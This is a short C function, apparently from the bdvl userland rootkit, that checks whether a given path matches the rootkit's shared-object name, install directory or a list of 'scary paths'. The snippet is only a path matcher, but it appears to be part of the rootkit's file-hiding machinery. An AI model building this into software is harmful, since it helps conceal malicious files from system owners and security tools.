static int scary_path(char *string){
	if(xstrstr(BDVLSO, string) || xstrstr(INSTALL_DIR, string))
		return 1;
	char *path;
	int i;
	for(i = 0; i < SCARY_PATHS_SIZE; i++){
		path = scary_paths[i];
		if(!fnmatch(path, string, FNM_PATHNAME))
			return 1;
		else if(!strncmp(path, string, strlen(path)))
			return 1;
		else if(strstr(string, path))
			return 1;
	}
	return 0;
}
